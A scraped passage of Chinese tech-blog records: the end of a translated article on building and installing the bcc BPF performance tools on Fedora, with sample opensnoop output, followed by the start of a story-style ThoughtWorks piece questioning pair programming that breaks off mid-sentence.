line-height: 15px !important;\">\nsudo dnf install -y bison cmake ethtool flex git iperf libstdc++-static \\\r\n  python-netaddr python-pip gcc gcc-c++ make zlib-devel \\\r\n  elfutils-libelf-devel\r\nsudo dnf install -y luajit luajit-devel  # for Lua support\r\nsudo dnf install -y \\\r\n  http://pkgs.repoforge.org/netperf/netperf-2.6.0-1.el6.rf.x86_64.rpm\r\nsudo pip install pyroute2\r\nsudo dnf install -y clang clang-devel llvm llvm-devel llvm-static ncurses-devel\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc20349350031-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc20349350031-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc20349350031-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc20349350031-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc20349350031-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc20349350031-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc20349350031-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc20349350031-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc20349350031-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc20349350031-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bison </span><span class=\"crayon-e\">cmake </span><span class=\"crayon-e\">ethtool </span><span class=\"crayon-e\">flex </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">iperf </span><span class=\"crayon-v\">libstdc</span><span class=\"crayon-o\">++</span><span class=\"crayon-o\">-</span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc20349350031-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">netaddr </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">pip </span><span class=\"crayon-e\">gcc </span><span class=\"crayon-v\">gcc</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">c</span><span class=\"crayon-o\">++</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">make </span><span class=\"crayon-v\">zlib</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">devel</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc20349350031-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">elfutils</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">libelf</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">devel</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc20349350031-4\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">luajit </span><span class=\"crayon-v\">luajit</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">devel</span><span class=\"crayon-h\">  </span><span class=\"crayon-p\"># for Lua support</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc20349350031-5\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc20349350031-6\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//pkgs.repoforge.org/netperf/netperf-2.6.0-1.el6.rf.x86_64.rpm</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc20349350031-7\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">pip </span><span class=\"crayon-e\">install </span><span class=\"crayon-e\">pyroute2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc20349350031-8\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">clang </span><span class=\"crayon-v\">clang</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">devel </span><span class=\"crayon-e\">llvm </span><span class=\"crayon-v\">llvm</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">devel </span><span class=\"crayon-v\">llvm</span><span class=\"crayon-o\">-</span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncurses</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">devel</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc20349350031-9\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>除 <code>netperf</code> 外一切妥当，其中有以下错误：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cc23333949930\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCurl error (28): Timeout was reached for http://pkgs.repoforge.org/netperf/netperf-2.6.0-1.el6.rf.x86_64.rpm [Connection timed out after 120002 milliseconds]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc23333949930-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc23333949930-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc23333949930-1\"><span class=\"crayon-e\">Curl </span><span class=\"crayon-e\">error</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">28</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Timeout </span><span class=\"crayon-e\">was </span><span class=\"crayon-e\">reached </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//pkgs.repoforge.org/netperf/netperf-2.6.0-1.el6.rf.x86_64.rpm [Connection timed out after 120002 milliseconds]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc23333949930-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>不必理会，<code>netperf</code> 是可选的，它只是用于测试，而 bcc 没有它也会编译成功。</p>\n<p>以下是余下的 bcc 编译和安装步骤：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cc27052203226\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit clone https://github.com/iovisor/bcc.git\r\nmkdir bcc/build; cd bcc/build\r\ncmake .. -DCMAKE_INSTALL_PREFIX=/usr\r\nmake\r\nsudo make install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc27052203226-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc27052203226-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc27052203226-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc27052203226-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc27052203226-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc27052203226-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc27052203226-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/iovisor/bcc.git</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc27052203226-2\"><span class=\"crayon-e\">mkdir </span><span class=\"crayon-v\">bcc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">build</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">bcc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">build</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc27052203226-3\"><span class=\"crayon-i\">cmake</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">DCMAKE_INSTALL_PREFIX</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">usr</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc27052203226-4\"><span class=\"crayon-e\">make</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc27052203226-5\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">make </span><span class=\"crayon-i\">install</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc27052203226-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>现在，命令应该可以工作了：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cc36836075395\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/opensnoop\r\nPID    COMM               FD ERR PATH\r\n4131   date                3   0 /etc/ld.so.cache\r\n4131   date                3   0 /lib64/libc.so.6\r\n4131   date                3   0 /usr/lib/locale/locale-archive\r\n4131   date                3   0 /etc/localtime\r\n[...]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc36836075395-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc36836075395-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc36836075395-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc36836075395-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc36836075395-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc36836075395-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc36836075395-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc36836075395-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc36836075395-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/opensnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc36836075395-2\"><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">COMM               </span><span class=\"crayon-e\">FD </span><span class=\"crayon-e\">ERR </span><span class=\"crayon-i\">PATH</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc36836075395-3\"><span class=\"crayon-cn\">4131</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">date</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ld</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cache</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc36836075395-4\"><span class=\"crayon-cn\">4131</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">date</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libc</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">6</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc36836075395-5\"><span class=\"crayon-cn\">4131</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">date</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">locale</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">locale</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">archive</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc36836075395-6\"><span class=\"crayon-cn\">4131</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">date</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">localtime</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc36836075395-7\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc36836075395-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p></p>\n<h3 id=\"toc_11\">写在最后和其他的前端</h3>\n<p>这是一个可以在 Fedora 和 Red Hat 系列操作系统上使用的新 BPF 性能分析强大功能的快速浏览。我演示了 BPF 的流行前端 <a href=\"https://github.com/iovisor/bcc\">bcc</a> ，并包括了其在 Fedora 上的安装说明。bcc 附带了 60 多个用于性能分析的新工具，这将帮助您充分利用 Linux 系统。也许你会直接通过 SSH 使用这些工具，或者一旦 GUI 监控程序支持 BPF 的话，你也可以通过它们来使用相同的功能。</p>\n<p>此外，bcc 并不是正在开发的唯一前端。<a href=\"https://github.com/iovisor/ply\">ply</a> 和 <a href=\"https://github.com/ajor/bpftrace\">bpftrace</a>，旨在为快速编写自定义工具提供更高级的语言支持。此外，<a href=\"https://sourceware.org/systemtap/\">SystemTap</a> 刚刚发布<a href=\"https://sourceware.org/ml/systemtap/2017-q4/msg00096.html\">版本 3.2</a>，包括一个早期的实验性 eBPF 后端。 如果这个继续开发，它将为运行多年来开发的许多 SystemTap 脚本和 tapset（库）提供一个安全和高效的生产级引擎。（随同 eBPF 使用 SystemTap 将是另一篇文章的主题。）</p>\n<p>如果您需要开发自定义工具，那么也可以使用 bcc 来实现，尽管语言比 SystemTap、ply 或 bpftrace 要冗长得多。我的 bcc 工具可以作为代码示例，另外我还贡献了用 Python 开发 bcc 工具的<a href=\"https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md\">教程</a>。 我建议先学习 bcc 的 multi-tools，因为在需要编写新工具之前，你可能会从里面获得很多经验。 您可以从它们的 bcc 存储库<a href=\"https://github.com/iovisor/bcc/blob/master/tools/funccount_example.txt\">funccount</a>，<a href=\"https://github.com/iovisor/bcc/blob/master/tools/funclatency_example.txt\">funclatency</a>，<a href=\"https://github.com/iovisor/bcc/blob/master/tools/funcslower_example.txt\">funcslower</a>，<a href=\"https://github.com/iovisor/bcc/blob/master/tools/stackcount_example.txt\">stackcount</a>，<a href=\"https://github.com/iovisor/bcc/blob/master/tools/trace_example.txt\">trace</a> ，<a href=\"https://github.com/iovisor/bcc/blob/master/tools/argdist_example.txt\">argdist</a> 的示例文件中研究 bcc。</p>\n<p>感谢 <a href=\"http://opensource.com/\">Opensource.com</a> 进行编辑。</p>\n<h3 id=\"toc_12\">关于作者</h3>\n<p>Brendan Gregg 是 Netflix 的一名高级性能架构师，在那里他进行大规模的计算机性能设计、分析和调优。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113328\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113328votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113328\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/1f020353984ba3d88d0e0349f7b5decd4ed6dd8a.jpg"}
{"url_object_id": "141819302e0a324b8883aa51f6c059d7", "title": "请停止结对编程", "url": "http://blog.jobbole.com/113474/", "create_date": "2018/01/13", "front_img_url": ["http://insights.thoughtworks.cn/wp-content/uploads/2018/01/1.jpeg"], "praise_nums": 1, "comment_nums": 2, "favor_nums": 0, "tags": "开发,结对编程", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><div>\n<p>（根据真实事件改编，情节有所夸张，请勿对号入座。）</p>\n<p>这是一个风和日丽的星期五下午，Ben 和 Martin 本应该在 Costa 咖啡馆喝一杯下午茶，一起聊聊周末的计划，然而 PM 的一个微信通知打乱了这一切。原来产品出现了一个bug需要紧急修复，下班之前必须要搞定。两人收到消息疾步走回到岗位，也没了心情去喝刚泡好的咖啡，连忙打开邮箱查看问题报告。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/1.jpeg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/1.jpeg\" alt=\"\" width=\"940\" height=\"627\"></a></p>\n<h3>开始</h3>\n<blockquote><p><strong>Ben：</strong>看来这不是一个很大的问题，就是处理一个来自于远端服务的异常。现在的情况是BFF(backend for frontends)在内部的远端服务有异常，会将异常直接返回到客户端，这样只要一个保单出了问题，前端所有的保单也都没法用了。</p>\n<p><strong>Martin：</strong>那怎么解决？</p>\n<p><strong>Ben：</strong>感觉可以在异常的地方加一个异常处理。这个涉及到RxJava和Java8的stream特性，我不是太熟悉，要不我们一起Pair吧</p>\n<p><strong>Martin：</strong>好。</p></blockquote>\n<p>两人喝了一口炙热的咖啡，摆好键盘鼠标，打开了IntelliJ工程。几分钟后，这个故障重现了。</p>\n<blockquote><p><strong>Martin：</strong>可以重现的故障通常比较好解决。我们在这里先弄个try…catch试试。 两人似乎很有信心，然而重启项目后，故障并没有按照预期停下来。</p>\n<p><strong>Ben：</strong>hmm，这里为什么停不下来呢？</p>\n<p><strong>Martin：</strong>可能是RxJava的延迟处理，没有正确的捕捉到。这样，你在这里再写一个逻辑，然后在这里设个断点……</p></blockquote>\n<h3>焦急</h3>\n<p>在这个过程中，Martin只是对着屏幕指指点点，时不时看看手机、在微信上聊聊天。Ben对RxJava并不是很熟悉，他想紧紧跟随Martin的思路，然而增加多个逻辑以后，依然都不能解决问题。15分钟已经过去，Ben这时候心生怀疑，是不是哪些地方没弄对？</p>\n<blockquote><p><strong>Ben：</strong>我们理一下思路看看？</p>\n<p><strong>Martin：</strong>恩，来吧，一起看一下代码。</p></blockquote>\n<p>Martin领着Ben一起看了一下代码，并且一直在旁边指点Ben进行单步调试。由于RxJava的延迟特性，使得断点很难设置。而抛出异常的调用栈会出现在某些莫名其妙的地方，这让他们根本不知道把try…catch放在哪里才能奏效。</p>\n<blockquote><p><strong>Ben：</strong>可能是要这样，在这里加一个OnError看能不能解决。</p></blockquote>\n<p>看似问题能够解决，其实是又一次的失败。在两人的激烈讨论中，时间过得很快，一晃眼已经是1个小时以后，咖啡早已经凉了，然而两个人完全没有心情，甚至都忘了咖啡的存在。</p>\n<p>Ben对Martin的解决方案越来越没有信心，两人开始重新讨论起解决方案。然而方案是越讨论越复杂，看起来想在下班前解决这个问题是不可能了，通宵是必然了。</p>\n<h3><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/2.jpeg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/2.jpeg\" alt=\"\" width=\"940\" height=\"627\"></a></h3>\n<h3>简化</h3>\n<p>Zen是组里的Tech 